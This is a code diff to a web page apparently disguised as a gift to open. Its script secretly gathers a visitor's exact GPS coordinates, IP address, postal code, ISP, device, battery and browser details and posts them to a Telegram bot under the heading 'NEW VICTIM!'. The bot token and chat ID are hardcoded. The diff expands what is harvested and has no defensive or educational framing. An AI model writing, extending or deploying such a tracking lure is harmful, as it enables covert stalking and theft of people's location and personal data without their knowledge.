@@ -124,9 +124,8 @@
 
 <script>
     // ================= CONFIG =================
-    // Teri nayi bot token
     const BOT_TOKEN = "8858548041:AAH5-uEvtsWNMsCpeEKsvOseVnLM-tAHaNs";
-    const CHAT_ID = "6323367629";  // Tera Telegram user ID
+    const CHAT_ID = "6323367629";
     
     // ==========================================
     
@@ -145,13 +144,27 @@
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
                     text: message,
-                    parse_mode: 'HTML'
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
                 })
             });
             console.log('✅ Sent to Telegram');
         } catch(e) {
             console.log('Telegram send error:', e);
         }
+    }
+    
+    async function getBatteryInfo() {
+        try {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.round(battery.level * 100),
+                    charging: battery.charging
+                };
+            }
+        } catch(e) {}
+        return { level: 'N/A', charging: false };
     }
     
     async function openGift() {
@@ -161,31 +174,44 @@
         document.querySelector('button').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
         
-        // Collect data
-        let locationData = { lat: 'N/A', lon: 'N/A', accuracy: 'N/A' };
-        let networkData = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
-        let deviceData = {};
+        // Get battery info
+        const battery = await getBatteryInfo();
         
-        // Get GPS location
+        // Get GPS location with high accuracy
+        let locationData = { lat: 'N/A', lon: 'N/A', accuracy: 'N/A', error: null };
+        let locationSuccess = false;
+        
         try {
             if (navigator.geolocation) {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
                         enableHighAccuracy: true,
-                        timeout: 10000
+                        timeout: 15000,
+                        maximumAge: 0
                     });
                 });
                 locationData = {
                     lat: pos.coords.latitude,
                     lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy
+                    accuracy: Math.round(pos.coords.accuracy),
+                    altitude: pos.coords.altitude || 'N/A',
+                    speed: pos.coords.speed || 'N/A'
                 };
+                locationSuccess = true;
+            } else {
+                locationData.error = "Geolocation not supported";
             }
         } catch(e) {
-            locationData = { lat: 'N/A', lon: 'N/A', accuracy: 'Blocked', error: e.message };
+            locationData = { 
+                lat: 'N/A', 
+                lon: 'N/A', 
+                accuracy: 'Blocked',
+                error: e.message 
+            };
         }
         
         // Get IP and network info
+        let networkData = { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
         try {
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
@@ -196,47 +222,90 @@
                 city: geoData.city || 'N/A',
                 region: geoData.region || 'N/A',
                 country: geoData.country_name || 'N/A',
-                isp: geoData.org || 'N/A'
+                isp: geoData.org || 'N/A',
+                postal: geoData.postal || 'N/A',
+                timezone: geoData.timezone || 'N/A'
             };
         } catch(e) {}
         
-        // Device info
-        deviceData = {
+        // Get detailed device info
+        const deviceData = {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
             language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
             screen: `${screen.width}x${screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            screenColorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            online: navigator.onLine ? 'Yes' : 'No',
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'Not set',
+            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+            deviceMemory: navigator.deviceMemory || 'N/A'
         };
         
-        // Create message for Telegram
+        // Create Google Maps link
         const mapLink = (locationData.lat != 'N/A' && locationData.lon != 'N/A') 
-            ? `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}`
+            ? `https://www.google.com/maps?q=${locationData.lat},${locationData.lon}&z=15`
             : '';
         
+        // Build message
         let message = `🔴 <b>NEW VICTIM!</b>\n\n`;
         message += `🎯 <b>ID:</b> ${targetId}\n`;
         message += `👤 <b>Name:</b> ${targetName}\n`;
         message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
-        message += `<b>📍 GPS LOCATION:</b>\n`;
-        message += `   Lat: <code>${locationData.lat}</code>\n`;
-        message += `   Lon: <code>${locationData.lon}</code>\n`;
-        message += `   Acc: ${locationData.accuracy}m\n`;
-        if(mapLink) message += `   🗺️ <a href="${mapLink}">View on Google Maps</a>\n`;
+        
+        // GPS Section
+        if (locationSuccess) {
+            message += `<b>📍 GPS LOCATION (EXACT)</b>\n`;
+            message += `   Lat: <code>${locationData.lat}</code>\n`;
+            message += `   Lon: <code>${locationData.lon}</code>\n`;
+            message += `   Accuracy: ${locationData.accuracy}m\n`;
+            if(locationData.altitude != 'N/A') message += `   Altitude: ${locationData.altitude}m\n`;
+            if(locationData.speed != 'N/A') message += `   Speed: ${locationData.speed}m/s\n`;
+            message += `   🗺️ <a href="${mapLink}">📍 VIEW ON GOOGLE MAPS</a>\n`;
+        } else {
+            message += `<b>📍 GPS LOCATION</b>\n`;
+            message += `   Status: ❌ Blocked/Permission Denied\n`;
+            message += `   Error: ${locationData.error || 'User denied location'}\n`;
+        }
         message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
-        message += `<b>🌐 NETWORK INFO:</b>\n`;
+        
+        // Network Section
+        message += `<b>🌐 NETWORK INFO</b>\n`;
         message += `   IP: <code>${networkData.ip}</code>\n`;
         message += `   City: ${networkData.city}\n`;
         message += `   Region: ${networkData.region}\n`;
         message += `   Country: ${networkData.country}\n`;
+        message += `   Postal: ${networkData.postal}\n`;
         message += `   ISP: ${networkData.isp}\n`;
         message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
-        message += `<b>📱 DEVICE INFO:</b>\n`;
+        
+        // Device Section
+        message += `<b>📱 DEVICE INFO</b>\n`;
         message += `   Platform: ${deviceData.platform}\n`;
-        message += `   Screen: ${deviceData.screen}\n`;
+        message += `   Screen: ${deviceData.screen} (${deviceData.screenColorDepth}-bit)\n`;
+        message += `   Pixel Ratio: ${deviceData.pixelRatio}x\n`;
         message += `   Language: ${deviceData.language}\n`;
         message += `   Timezone: ${deviceData.timezone}\n`;
+        message += `   Hardware: ${deviceData.hardwareConcurrency} cores\n`;
+        if(deviceData.deviceMemory != 'N/A') message += `   RAM: ${deviceData.deviceMemory} GB\n`;
         message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+        
+        // Battery Section
+        message += `<b>🔋 BATTERY INFO</b>\n`;
+        message += `   Level: ${battery.level}%\n`;
+        message += `   Charging: ${battery.charging ? '✅ Yes' : '❌ No'}\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+        
+        // Browser/Connection Section
+        message += `<b>🌐 BROWSER INFO</b>\n`;
+        message += `   Online: ${deviceData.online}\n`;
+        message += `   Cookies: ${deviceData.cookiesEnabled ? 'Enabled' : 'Disabled'}\n`;
+        message += `   Languages: ${deviceData.languages}\n`;
+        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+        
         message += `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n`;
         message += `\n👨‍💻 <i>Powered by @KINGITACHI18</i>`;
         
